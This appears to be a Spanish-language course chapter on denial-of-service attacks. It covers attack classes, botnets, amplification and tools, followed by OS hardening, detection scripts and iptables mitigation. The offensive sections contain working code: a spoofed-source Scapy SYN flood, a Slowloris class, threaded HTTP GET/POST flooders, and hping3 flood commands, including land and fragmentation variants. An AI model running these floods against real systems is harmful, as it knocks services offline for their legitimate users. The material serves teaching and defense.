# Tema 7: Denegación de Servicio (DoS)

## Índice de Contenidos
1. [Ataques de Denegación de Servicio](#ataques-de-denegación-de-servicio)
2. [Tipos de Ataques DoS](#tipos-de-ataques-dos)
3. [Ataques DDoS (Distributed Denial of Service)](#ataques-ddos-distributed-denial-of-service)
4. [Técnicas Específicas de Ataque](#técnicas-específicas-de-ataque)
5. [Herramientas de Ataque](#herramientas-de-ataque)
6. [Seguridad del Sistema Operativo](#seguridad-del-sistema-operativo)
7. [Detección de Ataques DoS](#detección-de-ataques-dos)
8. [Mitigación y Prevención](#mitigación-y-prevención)

---

## Ataques de Denegación de Servicio

### Definición y Conceptos Fundamentales

#### ¿Qué es un Ataque DoS?
Un **ataque de denegación de servicio (DoS)** es un intento malicioso de hacer que un recurso de red sea inaccesible para sus usuarios legítimos, generalmente interrumpiendo temporalmente o suspendiendo indefinidamente los servicios de un host conectado a Internet.

```
DoS Attack Impact Model:
┌─────────────────────────────────────────────────────────┐
│                 Normal Operation                        │
│ ┌─────────────┐    ┌─────────────┐    ┌─────────────┐   │
│ │   Client 1  │───→│   Server    │←───│   Client 2  │   │
│ │             │    │             │    │             │   │
│ └─────────────┘    │  Available  │    └─────────────┘   │
│                    │  Resources  │                      │
│                    └─────────────┘                      │
└─────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────┐
│                During DoS Attack                        │
│ ┌─────────────┐    ┌─────────────┐    ┌─────────────┐   │
│ │   Client 1  │─X─→│   Server    │←─X─│   Client 2  │   │
│ │ (Blocked)   │    │             │    │ (Blocked)   │   │
│ └─────────────┘    │ Overwhelmed │    └─────────────┘   │
│        ▲           │  Resources  │           ▲          │
│        │           └─────────────┘           │          │
│        └─────────── Attack Traffic ─────────┘          │
└─────────────────────────────────────────────────────────┘
```

#### Objetivos de los Ataques DoS
**Motivaciones Principales:**
- **Disrupción del negocio**: Causar pérdidas financieras
- **Distracción**: Ocultar otros ataques simultáneos
- **Extorsión**: "DoS for hire" o ransomware
- **Competencia desleal**: Atacar competidores
- **Activismo**: Protestas digitales (hacktivismo)
- **Testing**: Pruebas de resistencia no autorizadas

### Clasificación de Ataques DoS

#### Por Mecanismo de Ataque
```
DoS Attack Classification:
├── Volume-Based Attacks
│   ├── UDP Floods
│   ├── ICMP Floods  
│   ├── Spoofed packet floods
│   └── Bandwidth consumption
├── Protocol Attacks
│   ├── SYN Floods
│   ├── Ping of Death
│   ├── Smurf attacks
│   └── Fragmented packet attacks
├── Application Layer Attacks
│   ├── HTTP floods
│   ├── Slowloris
│   ├── DNS query floods
│   └── Application-specific exploits
└── Resource Depletion Attacks
    ├── Memory exhaustion
    ├── CPU consumption
    ├── Connection table filling
    └── Disk space exhaustion
```

#### Por Número de Atacantes
```
Attack Scale Classification:
├── DoS (Denial of Service)
│   ├── Single source attack
│   ├── Limited impact potential
│   ├── Easier to block/filter
│   └── Less sophisticated
└── DDoS (Distributed Denial of Service)
    ├── Multiple source attack
    ├── High impact potential
    ├── Difficult to block completely
    └── More sophisticated and effective
```

### Impacto en las Organizaciones

#### Costos Directos e Indirectos
```
DoS Attack Cost Analysis:
├── Direct Costs
│   ├── Revenue loss during outage
│   ├── Incident response costs
│   ├── Additional infrastructure/bandwidth
│   └── Legal and regulatory fees
├── Indirect Costs
│   ├── Customer trust and loyalty loss
│   ├── Brand reputation damage
│   ├── Stock price impact (public companies)
│   └── Opportunity costs
├── Operational Impact
│   ├── Employee productivity loss
│   ├── Service level agreement violations
│   ├── Emergency response resource allocation
│   └── Business continuity disruption
└── Long-term Effects
    ├── Increased security spending
    ├── Insurance premium increases
    ├── Regulatory scrutiny
    └── Competitive disadvantage
```

---

## Tipos de Ataques DoS

### Ataques de Saturación de Ancho de Banda

#### UDP Flood Attack
```
UDP Flood Mechanism:
Atacante ──────→ Flood de paquetes UDP ──────→ Víctima
           (Puertos aleatorios)              (Procesamiento intensivo)

Características:
├── Connectionless protocol abuse
├── No handshake required
├── Easily spoofed source addresses
├── Can target specific ports or random ports
└── Consumes bandwidth and processing power

Ejemplo de implementación:
# hping3 UDP flood
hping3 -2 -p 80 --flood target.com

# Custom UDP flood script
for i in {1..10000}; do
    echo "UDP flood packet $i" | nc -u target.com 53 &
done
```

#### ICMP Flood (Ping Flood)
```
ICMP Flood Process:
1. Atacante envía ping requests masivos
2. Target responde a cada ping (por defecto)
3. Bandwidth del target se satura
4. Legitimate traffic es bloqueado

Características:
├── Uses ICMP Echo Request packets
├── Target responds with Echo Reply
├── Amplifies bandwidth usage
├── Can be filtered easily
└── Often combined with other attacks

Comandos de ejemplo:
# Basic ping flood (Linux)
ping -f target.com

# Hping3 ICMP flood
hping3 -1 --flood target.com

# Large packet ICMP flood  
ping -s 65507 target.com
```

### Ataques de Agotamiento de Recursos

#### SYN Flood Attack
```
SYN Flood Attack Process:
┌─────────────────────────────────────────────────────────┐
│ Normal TCP 3-Way Handshake:                            │
│ Client ────SYN────→ Server                              │
│ Client ←──SYN/ACK─── Server                             │
│ Client ────ACK────→ Server (Connection Established)     │
└─────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────┐
│ SYN Flood Attack:                                       │
│ Attacker ────SYN1────→ Server (from spoofed IP1)       │
│ Attacker ────SYN2────→ Server (from spoofed IP2)       │
│ Attacker ────SYN3────→ Server (from spoofed IP3)       │
│ Server ←─(waiting for ACK responses that never come)─  │
│ Result: Connection table fills up, legitimate           │
│         connections are refused                         │
└─────────────────────────────────────────────────────────┘

Server State Table:
┌──────────────┬──────────────┬───────────────┐
│ Source IP    │ Source Port  │ State         │
├──────────────┼──────────────┼───────────────┤
│ 1.2.3.4      │ 1234         │ SYN_RECEIVED  │
│ 5.6.7.8      │ 2345         │ SYN_RECEIVED  │
│ 9.10.11.12   │ 3456         │ SYN_RECEIVED  │
│ ... (table fills up) ...                   │
└──────────────┴──────────────┴───────────────┘
```

#### Connection Exhaustion
```python
#!/usr/bin/env python3
# SYN Flood implementation example (educational purpose)
from scapy.all import *
import random

def syn_flood(target_ip, target_port, count):
    for i in range(count):
        # Random source IP
        src_ip = ".".join(str(random.randint(1,254)) for _ in range(4))
        src_port = random.randint(1024, 65535)
        
        # Create SYN packet
        packet = IP(src=src_ip, dst=target_ip) / \
                 TCP(sport=src_port, dport=target_port, flags="S")
        
        # Send packet
        send(packet, verbose=False)
        
    print(f"Sent {count} SYN packets to {target_ip}:{target_port}")

# Usage example
syn_flood("192.168.1.100", 80, 1000)
```

### Ataques de Vulnerabilidades Específicas

#### Slowloris Attack
```
Slowloris Attack Mechanism:
1. Open multiple HTTP connections to target
2. Send partial HTTP requests
3. Keep connections alive by sending headers slowly
4. Never complete the requests
5. Exhaust server's connection pool

HTTP Request Structure:
Normal:    GET / HTTP/1.1\r\nHost: target.com\r\n\r\n
Slowloris: GET / HTTP/1.1\r\nHost: target.com\r\n
          X-Custom-Header: value\r\n
          (wait...)
          X-Another-Header: value\r\n
          (wait...)
          [Connection never completed]

Characteristics:
├── Low bandwidth attack
├── Targets HTTP servers specifically
├── Exploits connection handling
├── Difficult to detect
└── Very effective against certain servers
```

#### Slowloris Implementation
```python
#!/usr/bin/env python3
import socket
import time
import threading
import random

class SlowlorisAttack:
    def __init__(self, target, port=80, connections=100):
        self.target = target
        self.port = port
        self.connections = connections
        self.sockets = []
        
    def create_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((self.target, self.port))
            
            # Send initial HTTP request
            sock.send(f"GET / HTTP/1.1\r\nHost: {self.target}\r\n".encode())
            sock.send("User-Agent: Mozilla/5.0\r\n".encode())
            return sock
        except:
            return None
    
    def start_attack(self):
        print(f"Starting Slowloris attack against {self.target}:{self.port}")
        
        # Create initial connections
        for _ in range(self.connections):
            sock = self.create_socket()
            if sock:
                self.sockets.append(sock)
        
        # Keep connections alive
        while True:
            for sock in self.sockets[:]:
                try:
                    # Send keep-alive header
                    header = f"X-Keep-Alive-{random.randint(1,1000)}: {random.randint(1,1000)}\r\n"
                    sock.send(header.encode())
                except:
                    self.sockets.remove(sock)
                    # Replace broken connection
                    new_sock = self.create_socket()
                    if new_sock:
                        self.sockets.append(new_sock)
            
            print(f"Active connections: {len(self.sockets)}")
            time.sleep(15)

# Usage
# attack = SlowlorisAttack("target.com")
# attack.start_attack()
```

---

## Ataques DDoS (Distributed Denial of Service)

### Arquitectura de Botnets

#### Estructura de Control DDoS
```
DDoS Botnet Architecture:
                    ┌─────────────────┐
                    │   Botmaster     │
                    │  (Attacker)     │
                    └─────────┬───────┘
                              │
                    ┌─────────▼───────┐
                    │ Command & Control│
                    │   (C&C Server)   │
                    └─────────┬───────┘
                              │
        ┌─────────────────────┼─────────────────────┐
        │                     │                     │
   ┌────▼────┐         ┌─────▼─────┐         ┌─────▼─────┐
   │ Bot 1   │         │   Bot 2   │         │   Bot 3   │
   │Zombie PC│         │ Zombie PC │         │ Zombie PC │
   └────┬────┘         └─────┬─────┘         └─────┬─────┘
        │                    │                     │
        └────────────────────┼─────────────────────┘
                             │
                    ┌────────▼────────┐
                    │     Target      │
                    │     Server      │
                    └─────────────────┘

Botnet Evolution:
├── Centralized (single C&C server)
├── Distributed (multiple C&C servers)
├── P2P (peer-to-peer, no central server)
└── Hybrid (combination of methods)
```

#### Tipos de Botnets
```
Botnet Categories:
├── Size-based Classification
│   ├── Small (< 1,000 bots)
│   ├── Medium (1,000 - 100,000 bots)
│   ├── Large (100,000 - 1M bots)
│   └── Massive (> 1M bots)
├── Purpose-based Classification
│   ├── DDoS-for-hire botnets
│   ├── Cryptocurrency mining
│   ├── Credential theft
│   ├── Spam distribution
│   └── Data exfiltration
├── Communication Protocol
│   ├── IRC (Internet Relay Chat)
│   ├── HTTP/HTTPS
│   ├── DNS
│   ├── P2P protocols
│   └── Social media platforms
└── Sophistication Level
    ├── Basic script kiddies
    ├── Commercial crime groups
    ├── State-sponsored actors
    └── Advanced persistent threats
```

### Amplification Attacks

#### DNS Amplification
```
DNS Amplification Attack:
1. Attacker sends small DNS query (60 bytes)
2. Spoofs source IP to victim's address
3. DNS server responds with large response (3000+ bytes)
4. Victim receives amplified traffic
5. Amplification factor: 50x or higher

Attack Flow:
Attacker ──60 byte query──→ DNS Server
     ▲ (spoofed source IP)        │
     │                            │
     │                       3000 byte
     │                       response
     │                            │
     │                            ▼
Victim ←─────────────────────────DNS Server
    (receives large responses)

Example DNS query for amplification:
dig ANY example.com @dns-server.com

Amplification Factor Calculation:
Response Size / Query Size = Amplification Factor
3000 bytes / 60 bytes = 50x amplification
```

#### NTP Amplification
```bash
# NTP Amplification query example
ntpdc -n -c monlist ntp-server.com

# Vulnerable NTP servers respond with:
# - Up to 600 bytes of data
# - List of last 600 hosts that connected
# - Query size: ~50 bytes
# - Amplification factor: ~12x

# Mitigation: Disable monlist command
# ntpd.conf: disable monitor
```

#### Memcached Amplification
```
Memcached Amplification (CVE-2018-1000115):
Query: "stats\r\n" (7 bytes)
Response: Detailed server statistics (up to 750KB)
Amplification Factor: Up to 51,000x

Attack vectors:
├── UDP protocol (connectionless)
├── No authentication required
├── Reflects to spoofed source IP
├── Massive amplification potential
└── Internet-exposed Memcached servers

Mitigation:
├── Disable UDP support: -U 0
├── Bind to localhost only
├── Firewall external access
└── Update to patched version
```

### Reflection Attacks

#### Smurf Attack (Historical)
```
Smurf Attack Mechanism:
1. Attacker sends ICMP ping to broadcast address
2. Source IP is spoofed to victim's address
3. All hosts in subnet respond to victim
4. Victim receives flood of ICMP replies

Attack Flow:
Attacker ──ICMP Echo Request──→ Broadcast Address
     ▲ (src: victim IP)          (192.168.1.255)
     │                                 │
     │                          Broadcast to all
     │                          hosts in subnet
     │                                 │
     │                                 ▼
Victim ←─────ICMP Replies─────── All Subnet Hosts
    (receives flood of responses)

Modern Mitigation:
├── Routers block directed broadcasts
├── Hosts ignore broadcast pings
├── Network configuration changes
└── Rate limiting ICMP responses
```

### Casos de Estudio DDoS Famosos

#### Mirai Botnet (2016)
```
Mirai Botnet Analysis:
├── Target: IoT devices (cameras, routers, DVRs)
├── Infection Method: Default credentials
├── Peak Size: ~600,000 infected devices
├── Notable Attacks:
│   ├── Krebs on Security (620 Gbps)
│   ├── OVH (1.1 Tbps peak)
│   └── Dyn DNS (major internet outage)
├── Attack Techniques:
│   ├── TCP flood
│   ├── UDP flood
│   ├── HTTP flood
│   └── GRE flood
└── Impact:
    ├── Twitter, Netflix, GitHub outages
    ├── East Coast US internet disruption
    ├── Awareness of IoT security issues
    └── Source code public release
```

---

## Técnicas Específicas de Ataque

### HTTP Flood Attacks

#### HTTP GET Flood
```python
#!/usr/bin/env python3
# HTTP flood attack implementation
import requests
import threading
import time

class HTTPFlooder:
    def __init__(self, target_url, threads=100, requests_per_thread=1000):
        self.target_url = target_url
        self.threads = threads
        self.requests_per_thread = requests_per_thread
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
    
    def flood_worker(self):
        session = requests.Session()
        for _ in range(self.requests_per_thread):
            try:
                response = session.get(self.target_url, headers=self.headers, timeout=5)
                print(f"Request sent: {response.status_code}")
            except:
                print("Request failed")
                continue
            time.sleep(0.01)  # Small delay to avoid immediate blocking
    
    def start_flood(self):
        print(f"Starting HTTP flood against {self.target_url}")
        threads = []
        
        for _ in range(self.threads):
            thread = threading.Thread(target=self.flood_worker)
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        for thread in threads:
            thread.join()

# Usage example (educational purpose only)
# flooder = HTTPFlooder("http://target.com")
# flooder.start_flood()
```

#### HTTP POST Flood
```python
#!/usr/bin/env python3
# HTTP POST flood with form data
import requests
import threading
import random
import string

def generate_random_data():
    return {
        'username': ''.join(random.choices(string.ascii_letters, k=10)),
        'password': ''.join(random.choices(string.ascii_letters + string.digits, k=15)),
        'email': f"{''.join(random.choices(string.ascii_letters, k=8))}@example.com",
        'message': ''.join(random.choices(string.ascii_letters + ' ', k=100))
    }

def post_flood_worker(target_url, count):
    session = requests.Session()
    for _ in range(count):
        try:
            data = generate_random_data()
            response = session.post(target_url, data=data, timeout=5)
            print(f"POST request sent: {response.status_code}")
        except:
            print("POST request failed")
            continue

# Multi-threaded POST flood
def start_post_flood(target_url, threads=50, requests_per_thread=100):
    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=post_flood_worker, 
                                 args=(target_url, requests_per_thread))
        thread.start()
        thread_list.append(thread)
    
    for thread in thread_list:
        thread.join()
```

### Advanced DoS Techniques

#### Slow HTTP Attacks
```
Slow HTTP Attack Variants:
├── Slowloris (slow headers)
│   ├── Opens multiple connections
│   ├── Sends headers very slowly
│   ├── Never completes request
│   └── Exhausts connection pool
├── Slow POST (R.U.D.Y.)
│   ├── Sends POST with large Content-Length
│   ├── Transmits body very slowly
│   ├── Keeps connection occupied
│   └── Resource exhaustion
├── Slow Read
│   ├── Advertises small TCP receive window
│   ├── Server buffers response
│   ├── Never acknowledges received data
│   └── Memory exhaustion on server
└── Connection Starvation
    ├── Opens maximum allowed connections
    ├── Keeps connections minimally active
    ├── Prevents new legitimate connections
    └── Service unavailability
```

#### Application-Specific DoS
```bash
# Database DoS via expensive queries
SELECT * FROM users u1 
CROSS JOIN users u2 
CROSS JOIN users u3 
WHERE u1.id = u2.id AND u2.id = u3.id;

# XML DoS (Billion Laughs Attack)
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
...
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>

# JSON DoS via nested objects
{
  "a": {
    "b": {
      "c": {
        ... (deeply nested structure)
      }
    }
  }
}
```

---

## Herramientas de Ataque

### LOIC (Low Orbit Ion Cannon)

#### Características y Uso
```
LOIC Features:
├── GUI-based DoS tool
├── HTTP, TCP, UDP flood capabilities
├── User-defined targets and parameters
├── Hivemind mode (botnet coordination)
├── Open source (legal implications)
└── Script kiddie tool (low sophistication)

Attack Types:
├── TCP Flood
│   ├── Establishes TCP connections
│   ├── Sends data continuously
│   └── Resource exhaustion
├── UDP Flood  
│   ├── Connectionless flooding
│   ├── Random or specific ports
│   └── Bandwidth saturation
└── HTTP Flood
    ├── GET/POST request flooding
    ├── Customizable headers
    └── Application layer attack
```

### HOIC (High Orbit Ion Cannon)

#### Advanced Features
```
HOIC Improvements over LOIC:
├── Higher impact attacks
├── Better evasion techniques
├── "Booster" plugins for specific targets
├── HTTP flood focus
├── Randomized request patterns
└── Coordinated attack capabilities

Booster Files:
├── Target-specific configurations
├── Custom HTTP headers
├── Request randomization patterns
├── Evasion techniques
└── Amplification methods
```

### Hping3 - Advanced Packet Crafting

#### Versatile DoS Tool
```bash
# TCP SYN flood
hping3 -S -p 80 --flood target.com

# UDP flood to random ports
hping3 -2 --flood --rand-source target.com

# ICMP flood with large packets
hping3 -1 -d 65000 --flood target.com

# TCP flood with random source IPs
hping3 -S -p 80 --flood --rand-source target.com

# Slowloris-style attack
hping3 -S -p 80 -i u1000 target.com

# Land attack (source = destination)
hping3 -S -p 80 -a target.com target.com

# TCP flood with specific flags
hping3 -p 80 -F -P -U --flood target.com

# Fragmentation attack
hping3 -1 -d 65000 -f target.com
```

### Stress Testing Tools (Legitimate Use)

#### Apache Bench (ab)
```bash
# Basic load test
ab -n 1000 -c 10 http://target.com/

# Sustained load test
ab -n 10000 -c 100 -t 60 http://target.com/

# POST request testing
ab -n 1000 -c 10 -p post_data.txt -T application/x-www-form-urlencoded http://target.com/login

# Custom headers
ab -n 1000 -c 10 -H "Accept-Encoding: gzip,deflate" http://target.com/
```

#### wrk - Modern Load Testing
```bash
# Basic usage
wrk -t12 -c400 -d30s http://target.com/

# Custom script
wrk -t12 -c400 -d30s -s script.lua http://target.com/

# Example script.lua for authentication
wrk.method = "POST"
wrk.body = "username=test&password=test"
wrk.headers["Content-Type"] = "application/x-www-form-urlencoded"
```

---

## Seguridad del Sistema Operativo

### Hardening de Sistemas Operativos

#### Linux Hardening para DoS Protection
```bash
# Network parameter tuning
# /etc/sysctl.conf

# SYN flood protection
net.ipv4.tcp_syncookies = 1
net.ipv4.tcp_max_syn_backlog = 2048
net.ipv4.tcp_synack_retries = 2
net.ipv4.tcp_syn_retries = 5

# IP spoofing protection
net.ipv4.conf.default.rp_filter = 1
net.ipv4.conf.all.rp_filter = 1

# ICMP flood protection
net.ipv4.icmp_echo_ignore_broadcasts = 1
net.ipv4.icmp_ignore_bogus_error_responses = 1
net.ipv4.icmp_echo_ignore_all = 0  # Set to 1 to disable ping

# Connection tracking
net.netfilter.nf_conntrack_max = 65536
net.netfilter.nf_conntrack_tcp_timeout_established = 600

# Memory protection
vm.min_free_kbytes = 65536
vm.swappiness = 10

# Apply changes
sysctl -p
```

#### Windows Hardening
```powershell
# PowerShell script for Windows DoS protection

# Enable SYN attack protection
netsh int ipv4 set global synattackprotect=enabled

# Configure TCP parameters
netsh int ipv4 set global tcpchimneyoffloadstate=enabled
netsh int ipv4 set global autotuninglevel=normal

# Firewall rules for rate limiting
netsh advfirewall firewall add rule name="Block excessive connections" dir=in action=block protocol=TCP localport=80 remoteip=any

# Registry modifications for TCP/IP stack
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "SynAttackProtect" -Value 2 -PropertyType DWord
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "TcpMaxHalfOpen" -Value 500 -PropertyType DWord
```

### Configuración Segura de Servicios

#### Web Server Hardening
```apache
# Apache configuration for DoS protection
# /etc/apache2/conf-available/security.conf

# Limit request size
LimitRequestBody 10485760  # 10MB

# Timeout configuration
Timeout 60
KeepAliveTimeout 15

# Connection limits
<IfModule mod_evasive24.c>
    DOSHashTableSize    2048
    DOSPageCount        2
    DOSPageInterval     1
    DOSSiteCount        50
    DOSSiteInterval     1
    DOSBlockingPeriod   600
    DOSEmailNotify      admin@example.com
</IfModule>

# Rate limiting with mod_limitipconn
<IfModule mod_limitipconn.c>
    <Location />
        MaxConnPerIP 10
    </Location>
</IfModule>

# Hide server information
ServerTokens Prod
ServerSignature Off
```

#### Nginx Configuration
```nginx
# /etc/nginx/nginx.conf

http {
    # Rate limiting
    limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;
    limit_conn_zone $binary_remote_addr zone=conn_limit_per_ip:10m;
    
    # Apply limits
    limit_req zone=one burst=20 nodelay;
    limit_conn conn_limit_per_ip 20;
    
    # Connection timeouts
    client_body_timeout 12;
    client_header_timeout 12;
    send_timeout 10;
    
    # Buffer sizes
    client_body_buffer_size 1K;
    client_header_buffer_size 1k;
    client_max_body_size 1k;
    large_client_header_buffers 2 1k;
    
    # Hide server information
    server_tokens off;
}
```

### Monitoreo de Recursos del Sistema

#### System Resource Monitoring
```bash
#!/bin/bash
# DoS monitoring script

LOG_FILE="/var/log/dos_monitoring.log"
THRESHOLD_CPU=80
THRESHOLD_MEM=85
THRESHOLD_CONN=1000

# Function to log with timestamp
log_message() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> $LOG_FILE
}

# Monitor CPU usage
cpu_usage=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}' | sed 's/%us,//')
if (( $(echo "$cpu_usage > $THRESHOLD_CPU" | bc -l) )); then
    log_message "HIGH CPU USAGE: ${cpu_usage}%"
    # Alert mechanism
    mail -s "DoS Alert: High CPU" admin@example.com < /dev/null
fi

# Monitor memory usage
mem_usage=$(free | grep Mem | awk '{printf "%.2f", ($3/$2) * 100.0}')
if (( $(echo "$mem_usage > $THRESHOLD_MEM" | bc -l) )); then
    log_message "HIGH MEMORY USAGE: ${mem_usage}%"
fi

# Monitor network connections
conn_count=$(netstat -an | grep ":80 " | grep ESTABLISHED | wc -l)
if [ $conn_count -gt $THRESHOLD_CONN ]; then
    log_message "HIGH CONNECTION COUNT: $conn_count"
    # Auto-mitigation: temporary IP blocking
    netstat -an | grep ":80 " | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head -5 | while read count ip; do
        if [ $count -gt 50 ]; then
            iptables -A INPUT -s $ip -j DROP
            log_message "BLOCKED IP: $ip (connections: $count)"
        fi
    done
fi
```

---

## Detección de Ataques DoS

### Indicadores de Ataque

#### Network-based Indicators
```
DoS Attack Indicators:
├── Traffic Volume Anomalies
│   ├── Sudden spike in bandwidth usage
│   ├── Unusual packet rates
│   ├── Protocol distribution changes
│   └── Geographic source anomalies
├── Connection Pattern Anomalies
│   ├── High number of half-open connections
│   ├── Connections from single IP ranges
│   ├── Unusual port scanning patterns
│   └── Short-lived connection floods
├── Protocol-Specific Indicators
│   ├── Malformed packet floods
│   ├── Fragmentation anomalies
│   ├── Protocol violation patterns
│   └── Amplification attack signatures
└── Application-level Indicators
    ├── Slow request patterns
    ├── Resource-intensive queries
    ├── Authentication failure spikes
    └── Error response floods
```

#### System Performance Indicators
```bash
# Real-time DoS detection script
#!/bin/bash

detect_dos_patterns() {
    # Check for SYN flood
    syn_flood=$(netstat -an | grep SYN_RECV | wc -l)
    if [ $syn_flood -gt 100 ]; then
        echo "ALERT: Potential SYN flood detected ($syn_flood half-open connections)"
    fi
    
    # Check for connection table exhaustion
    max_conn=$(sysctl net.core.somaxconn | awk '{print $3}')
    current_conn=$(netstat -an | grep ESTABLISHED | wc -l)
    usage_percent=$((current_conn * 100 / max_conn))
    if [ $usage_percent -gt 80 ]; then
        echo "ALERT: Connection table $usage_percent% full"
    fi
    
    # Check for unusual traffic patterns
    current_pps=$(sar -n DEV 1 1 | grep -E 'eth0|ens' | tail -1 | awk '{print $5}')
    if (( $(echo "$current_pps > 10000" | bc -l) )); then
        echo "ALERT: High packet rate detected: $current_pps pps"
    fi
    
    # Check for memory exhaustion
    mem_available=$(free | grep "Mem:" | awk '{print ($7/$2) * 100.0}')
    if (( $(echo "$mem_available < 10" | bc -l) )); then
        echo "ALERT: Low memory available: ${mem_available}%"
    fi
}

# Run detection
detect_dos_patterns
```

### Herramientas de Monitoreo

#### Network Monitoring Tools
```bash
# Real-time traffic analysis with iftop
iftop -i eth0 -t -s 10

# Packet rate monitoring with nload
nload eth0

# Connection monitoring with netstat
watch -n 1 "netstat -an | grep ':80 ' | grep -c ESTABLISHED"

# Advanced monitoring with ss (replacement for netstat)
ss -tuln | grep :80
ss -o state established '( sport = :80 or dport = :80 )'

# Traffic analysis with tcpdump
tcpdump -i eth0 -n -c 1000 | awk '{print $3}' | sort | uniq -c | sort -nr | head

# Bandwidth monitoring with vnstat
vnstat -i eth0 -l  # Live monitoring
```

#### SIEM Integration
```json
// ElasticSearch query for DoS detection
{
  "query": {
    "bool": {
      "must": [
        {
          "range": {
            "@timestamp": {
              "gte": "now-5m"
            }
          }
        },
        {
          "terms": {
            "source_ip": ["suspicious_ips_list"]
          }
        }
      ],
      "should": [
        {
          "range": {
            "request_count": {
              "gte": 1000
            }
          }
        },
        {
          "match": {
            "http_status": "503"
          }
        }
      ]
    }
  },
  "aggs": {
    "sources": {
      "terms": {
        "field": "source_ip",
        "size": 10
      }
    }
  }
}
```

### Sistemas de Alerta Temprana

#### Automated Response System
```python
#!/usr/bin/env python3
# Automated DoS detection and response system
import psutil
import subprocess
import time
import smtplib
from email.mime.text import MIMEText

class DoSDetector:
    def __init__(self):
        self.cpu_threshold = 80
        self.memory_threshold = 85
        self.connection_threshold = 1000
        self.alert_email = "admin@example.com"
        
    def check_system_health(self):
        # CPU usage check
        cpu_percent = psutil.cpu_percent(interval=1)
        if cpu_percent > self.cpu_threshold:
            self.send_alert(f"High CPU usage: {cpu_percent}%")
            return True
            
        # Memory usage check
        memory = psutil.virtual_memory()
        if memory.percent > self.memory_threshold:
            self.send_alert(f"High memory usage: {memory.percent}%")
            return True
            
        # Network connections check
        connections = len(psutil.net_connections())
        if connections > self.connection_threshold:
            self.send_alert(f"High connection count: {connections}")
            return True
            
        return False
    
    def get_top_connecting_ips(self):
        try:
            result = subprocess.run(['netstat', '-an'], capture_output=True, text=True)
            lines = result.stdout.split('\n')
            ip_counts = {}
            
            for line in lines:
                if ':80 ' in line and 'ESTABLISHED' in line:
                    parts = line.split()
                    if len(parts) > 4:
                        remote_addr = parts[4].split(':')[0]
                        ip_counts[remote_addr] = ip_counts.get(remote_addr, 0) + 1
            
            # Return top 5 IPs by connection count
            return sorted(ip_counts.items(), key=lambda x: x[1], reverse=True)[:5]
        except:
            return []
    
    def block_suspicious_ips(self, ip_list):
        for ip, count in ip_list:
            if count > 50:  # Block IPs with more than 50 connections
                try:
                    subprocess.run(['iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'], 
                                 check=True)
                    print(f"Blocked IP: {ip} (connections: {count})")
                except subprocess.CalledProcessError:
                    print(f"Failed to block IP: {ip}")
    
    def send_alert(self, message):
        try:
            msg = MIMEText(f"DoS Alert: {message}")
            msg['Subject'] = 'DoS Attack Detection Alert'
            msg['From'] = 'security@example.com'
            msg['To'] = self.alert_email
            
            # Configure SMTP server
            server = smtplib.SMTP('localhost')
            server.send_message(msg)
            server.quit()
        except:
            print(f"Failed to send email alert: {message}")
    
    def run_monitoring(self):
        print("Starting DoS monitoring...")
        while True:
            if self.check_system_health():
                suspicious_ips = self.get_top_connecting_ips()
                if suspicious_ips:
                    print("Top connecting IPs:")
                    for ip, count in suspicious_ips:
                        print(f"  {ip}: {count} connections")
                    self.block_suspicious_ips(suspicious_ips)
            
            time.sleep(30)  # Check every 30 seconds

# Usage
if __name__ == "__main__":
    detector = DoSDetector()
    detector.run_monitoring()
```

---

## Mitigación y Prevención

### Configuración de Firewalls

#### iptables Rules para DoS Protection
```bash
#!/bin/bash
# Comprehensive iptables DoS protection script

# Flush existing rules
iptables -F
iptables -X
iptables -Z

# Set default policies
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Allow loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# Allow established and related connections
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# SYN flood protection
iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 20 --connlimit-mask 32 -j REJECT --reject-with tcp-reset

# Rate limiting for new connections
iptables -A INPUT -p tcp --dport 80 -m state --state NEW -m recent --set
iptables -A INPUT -p tcp --dport 80 -m state --state NEW -m recent --update --seconds 60 --hitcount 10 -j DROP

# ICMP rate limiting
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 5/sec --limit-burst 10 -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-request -j DROP

# Block fragmented packets
iptables -A INPUT -f -j DROP

# Block invalid packets
iptables -A INPUT -m conntrack --ctstate INVALID -j DROP

# Block NULL packets
iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP

# Block SYN-FIN packets
iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP

# Block Christmas tree packets
iptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP

# Block packets with bogus TCP flags
iptables -A INPUT -p tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG NONE -j DROP
iptables -A INPUT -p tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG ALL -j DROP

